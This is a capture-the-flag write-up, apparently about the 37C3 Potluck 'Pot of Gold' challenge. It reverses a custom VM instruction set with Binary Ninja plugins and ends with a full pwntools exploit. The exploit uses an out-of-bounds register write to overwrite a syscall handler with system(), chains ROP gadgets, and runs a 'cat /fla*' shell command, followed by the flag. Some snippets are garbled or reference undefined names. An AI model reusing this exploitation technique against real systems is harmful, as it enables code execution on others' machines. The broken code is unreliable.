# LEVERAGING BINARY NINJA IL TO REVERSE A CUSTOM ISA: CRACKING THE “POT OF GOLD” 37C3

> 原文: https://www.ctfiot.com/164127.html
> ID: 164127


```
#!/bin/sh

(/chall /gordon.bin /tmp/x 1 >/dev/null 2>/dev/null) &
sleep 1
/chall /kitchen.bin /tmp/x 0
// From reverse engineering of the parsing loop
struct unicorn_blob_file {
 char magic[8]; // const "UNICORN"
 uint16_t nb_segments;
 struct segment {
 uint16_t virtual_base;
 uint16_t size;
 uint16_t protection; // bitfield 1 - read ; 2 - write ; 4 - exec
 } segments[ANYSIZE_ARRAY]; // array of size nb_segments
 char data[ANYSIZE_ARRAY]; // first segment data (array of size segments[0].size)
};
// inside main function
 do
 {
 if ( exec_one_instruction(vm) )
 exit(1);
 }
 while ( !vm->stopped );
struct vm {
 uint64_t regs[8]; // General Purpose Register
 uint64_t sp;
 uint64_t lr;
 uint64_t pc;
 uint64_t fl; // flags register
 void * mem; // Memory mapping linked list
 void (*handle_syscall)(struct vm*, int syscall_id);
 bool stopped;
 bool is_master;
};
int exec_one_instruction(vm * vm)
{
 if ( (get_segment_prot(vm, vm->pc) & PROT_EXEC) == 0 )
 exit(1);
 // Read instruction
 read_vm_memory(vm, vm->pc, &opcode, 1);
 read_vm_memory(vm, vm->pc + 1, &arg1, 1);
 read_vm_memory(vm, vm->pc + 2, &arg3, 1);
 read_vm_memory(vm, vm->pc + 3, &arg2, 1);
 arg23 = _byteswap_ushort((arg3 << 8) | arg2);
 // Parse and execute instruction
 switch ( opcode )
 {
 case 0:
 // NOP
 break;
 /* ... */
 case 4:
 // ALU ops
 /* ... */
 switch ( arg1 >> 4 )
 {
 case 0:
 vm->regs[arg3] = vm->regs[arg2] + operand;
 break;
 case 1:
 vm->regs[arg3] = vm->regs[arg2] - operand;
 break;
 case 2:
 vm->regs[arg3] =vm->regs[arg2] * operand;
 break;
 /* ... */
 }
 break;
 case 5:
 // Syscall
 vm->handle_syscall(vm, arg1);
 break;
 /* ... */
 case 8:
 // Push
 vm->sp -= 8;
 write_vm_memory(vm, vm->sp, &vm->regs[arg1], 8);
 break;
 case 9:
 // Pop
 read_vm_memory(vm, vm->sp, &vm->regs[arg1], 8);
 vm->sp += 8;
 break;
 /* ... */
 case 0xC:
 // Branch to link register (ret)
 vm->pc = vm->lr;
 return 0;
 }
 vm->pc += 4;
}
from struct import unpack
from binaryninja.binaryview import BinaryView
from binaryninja.enums import SegmentFlag

class POTLUCKView(BinaryView):
 name = 'POTLUCKView'
 long_name = 'POTLUCKView ROM'

 def __init__(self, data):
 BinaryView.__init__(self, parent_view = data, file_metadata = data.file)
 # self.platform = Architecture['POTLUCK'].standalone_platform
 self.data = data

 @classmethod
 def is_valid_for_data(self, data):
 header = data.read(0, 7)
 return header == b'UNICORN'

 def perform_get_address_size(self):
 return 8

 def init(self):
 # Parse struct unicorn_blob_file
 segment_count = unpack("<H", self.data.read(0x8, 2))[0]
 print(f"segment count = {segment_count}")
 # Only the first segment is loaded from file
 base = unpack("<H", self.data.read(0xA, 2))[0]
 size = unpack("<H", self.data.read(0xC, 2))[0]
 prot = unpack("<H", self.data.read(0xE, 2))[0]
 # Load code + data from file offset (0xA + sizeof(struct segment) * segment_count) at base: 0x0
 self.add_auto_segment(base, size, 0xA + 6 * segment_count, size, SegmentFlag.SegmentReadable|SegmentFlag.SegmentExecutable)
 # No need to load the zeroed stack segment (read full loader code if interested)
 return True

 def perform_is_executable(self):
 return True

 def perform_get_entry_point(self):
 return 0

POTLUCKView.register()
from typing import Callable, List, Type, Optional, Dict, Tuple, NewType

from binaryninja.architecture import Architecture, InstructionInfo, RegisterInfo
from binaryninja.lowlevelil import LowLevelILFunction
from binaryninja.function import InstructionTextToken
from binaryninja.enums import InstructionTextTokenType

class POTLUCK(Architecture):
 name = "POTLUCK"
 address_size = 4
 default_int_size = 4
 instr_alignment = 4
 max_instr_length = 4
 regs = {
 'R0': RegisterInfo('R0', 4),
 'R1': RegisterInfo('R1', 4),
 'R2': RegisterInfo('R2', 4),
 'R3': RegisterInfo('R3', 4),
 'R4': RegisterInfo('R4', 4),
 'R5': RegisterInfo('R5', 4),
 'R6': RegisterInfo('R6', 4),
 'R7': RegisterInfo('R7', 4),
 'SP': RegisterInfo('SP', 4),
 'LR': RegisterInfo('LR', 4),
 }
 stack_pointer = "SP"
 link_reg = "LR"

 def get_instruction_info(self, data:
bytes, addr:
int) -> Optional[InstructionInfo]:
 return None

 def get_instruction_text(self, data: bytes, addr: int) -> Optional[Tuple[List[InstructionTextToken], int]]:
 opcode = data[0]
 arg1 = data[1]
 ops = []
 if opcode == 8:
 ops.append(InstructionTextToken(InstructionTextTokenType.TextToken, "push "))
 ops.append(InstructionTextToken(InstructionTextTokenType.RegisterToken, f'R{arg1}'))
 elif opcode == 9:
 ops.append(InstructionTextToken(InstructionTextTokenType.TextToken, "pop "))
 ops.append(InstructionTextToken(InstructionTextTokenType.RegisterToken, f'R{arg1}'))
 return ops, 4 # len of instruction

 def get_instruction_low_level_il(self, data: bytes, addr: int, il: LowLevelILFunction) -> Optional[int]:
 return None

POTLUCK.register()
def get_instruction_info(self, data:
bytes, addr:
int) -> Optional[InstructionInfo]:
 info = InstructionInfo()
 info.length = 4
 return info
def get_instruction_info(self, data:
bytes, addr:
int) -> Optional[InstructionInfo]:
 if not is_valid_instruction(data):
 return None
 opcode = data[0]
 arg1 = data[1]
 arg23 = get_arg23(data[2:4])
 result = InstructionInfo()
 result.length = 4
 if opcode == 5: # SYSCALL
 result.add_branch(BranchType.SystemCall, arg1)
 elif opcode == 1: # BRANCH
 if arg1 == 0:
 result.add_branch(BranchType.UnconditionalBranch, addr + arg23) # b +imm
 else:
 result.add_branch(BranchType.TrueBranch, addr + arg23) # b +imm if flag
 result.add_branch(BranchType.FalseBranch, addr + 4) # continue if not flag
 elif opcode == 10: # CALL
 if arg1 == 1:
 result.add_branch(BranchType.IndirectBranch) # call register
 else:
 result.add_branch(BranchType.CallDestination, addr + arg23) # call +imm
 elif opcode == 12: # RET
 result.add_branch(BranchType.FunctionReturn)
 return result
def get_instruction_low_level_il(self, data: bytes, addr: int, il: LowLevelILFunction) -> Optional[int]:
 # ...
 # Represent: xor rX, 0xX
 dst = src = RegisterName(get_register_name(arg[0]))
 operand = il.const(4, arg[1])
 ## value of rX
 op = il.reg(4, src)
 # XOR (value of rX, const)
 op = il.xor_expr(4, op, operand)
 # set value of rX (XOR (value of rX, const))
 op = il.set_reg(4, dst, op)
 # Append it to the il `LowLevelILFunction`
 il.append(op)
 return 4 # len of instruction
# Lift syscall in get_instruction_low_level_il
il.append(il.set_reg(4, RegisterName('ID'), il.const(4, arg1)))
i = il.system_call()

# Syscall custom calling convention
class CustomSyscall(CallingConvention):
 int_arg_regs = ['ID', 'R0', 'R1']
 int_return_reg = 'R0'
 eligible_for_heuristics = False # force display of int_arg_regs

# Register custom calling convention
CustomSyscall(arch=Architecture['POTLUCK'], name='CustomSyscall')
Architecture['POTLUCK'].register_calling_convention(cc_sys)
self.platform.system_call_convention = cc_sys
// Low level IL representation
0x00000380 int32_t command_c0ca(int32_t* arg1 @ R0)

 0x00000380 push(LR)
 0x00000384 SP = SP - 0x80
 0x00000388 R1 = R0
 0x0000038c R0 = SP {var_84}
 0x00000390 R2 = 0x100
 0x00000394 call(memcpy) // memcpy(&var_84, arg1, 0x100);
 0x00000398 SP = SP + 0x80
 0x0000039c LR = pop
 0x000003a0 <return> jump(LR)
def decrypt(addr, size):
 o = b''
 for i, e in enumerate(bv.read(addr, size)):
 key = struct.pack('>> decrypt(0x1239, 38)
# b"Welcome to Shell's Kitchen, stranger!\n"
0x0000164 pop LR
0x0000168 pop R5
0x000016c pop R4
0x0000170 pop R2
0x0000174 pop R1
0x0000178 pop R0
0x000017c ret
uint64_t regs[8];
 uint64_t sp; // OOB index 8 (0x8)
 uint64_t lr; // OOB index 9 (0x9)
 uint64_t pc; // OOB index 10 (0xa)
 uint64_t fl; // OOB index 11 (0xb)
 void * mem; // OOB index 12 (0xc)
 void (*handle_syscall)(struct vm*, int syscall_id); // OOB index 13 (R13) (0xd)
case 7:
 /* ... */
 vm->regs[arg1 >> 4] = vm->regs[arg3];
from pwn import *

r = remote('challenge27.play.potluckctf.com', 31337)

# Secret challenge
r.recvuntil(b'stew:\n\n')
secret = bytes.fromhex(r.recvline().strip().decode())
code = xor(secret, p32(0xc0cac01a) + p32(0xd15ea5e) + p32(0x5caff01d) + p32(0xba5eba11)).hex().encode()
r.sendline(code)

# Select vulnerable command 2
r.recvuntil(b'choice> ')
r.sendline(b'2')
r.recvline()

# Gadgets
pop_lr_r5_r4_r2_r1_r0 = 0x164
send_command_gadget = 0x5b0
recv_and_print = 0x714
stack_in_kitchen = 0xfdb8
stack_in_gordon = 0xef7c
system_api_chall = 0x4033A2

# Payload
payload = p32(0xc0cac01a) # command magic
# Gordon shellcode
'''
syscall instruction -> handle_syscall(vm) -> system(vm) -> system(&vm->regs[0])
r0/r1/r2 -> "cat /fla* > /tmp/x_master\x00"
'''
payload += b'\x09\x05\x00\x00' # pop r5 -- @system
payload += b'\x07\xd0\x05\x00' # mov R13, R5 -- write to handle_syscall
payload += b'\x09\x00\x00\x00' # pop r0 -- cat /flag...
payload += b'\x09\x01\x00\x00' # pop r1
payload += b'\x09\x02\x00\x00' # pop r2
payload += b'\x09\x03\x00\x00' # pop r3
payload += b'\x05\x07\x00\x00' # syscall 7

assert len(payload) <= 0x40
payload += b'X' * (0x40 - len(payload))
# Kitchen ROP chain
payload += p64(pop_lr_r5_r4_r2_r1_r0)
payload += p64(send_command) # lr
payload += p64(0) # r5
payload += p64(0) # r4
payload += p64(0) # r2
payload += p64(0x100) # r1
payload += p64(stack_in_kitchen) # r0
payload += p64(recv_and_print) # recv + print
payload += b'X' * (0x80 - len(payload))
# Gordon ret2shellcode
payload += p64(stack_in_gordon)
# Gordon shellcode pop
payload += p64(system_api_chall) # @system
payload += b'cat /fla* > /tmp/x_master\x00' # cmd

assert not b"\x0a" in payload
assert not b"\x0d" in payload
payload += b'\n'

r.send(payload)

r.interactive()
# potluck{3y3_4m_n0t_th3_0n3_t0_s0Rt_0f_s1T_4nD_cRY_0v3R_sP1Lt_m1LK!1!!}
```
